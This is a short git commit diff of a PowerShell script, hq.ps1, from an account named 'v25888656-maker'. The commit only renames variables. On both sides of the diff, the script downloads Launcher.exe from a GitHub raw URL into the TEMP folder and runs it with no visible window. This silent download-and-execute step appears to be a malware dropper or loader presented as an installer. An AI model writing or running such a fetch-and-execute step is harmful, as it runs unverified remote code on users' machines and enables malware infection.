c333d8487b060397f3d8298dd9da2e5f9830bb77
v25888656-maker <v25888656@gmail.com>
2026-06-20 18:18:24 +0300

    Update hq.ps1

--- hq.ps1
+++ hq.ps1
@@ -1,4 +1,4 @@
-$exeUrl = "https://raw.githubusercontent.com/v25888656-maker/installer/refs/heads/main/Launcher.exe"
-$exePath = "$env:TEMP\Launcher.exe"
-irm -Uri $exeUrl -OutFile $exePath
-Start-Process -FilePath $exePath -NoNewWindow
+$execUrl = "https://raw.githubusercontent.com/v25888656-maker/installer/main/Launcher.exe"
+$execPath = "$env:TEMP\Launcher.exe"
+irm -Uri $execUrl -OutFile $execPath
+Start-Process -FilePath $execPath -NoNewWindow
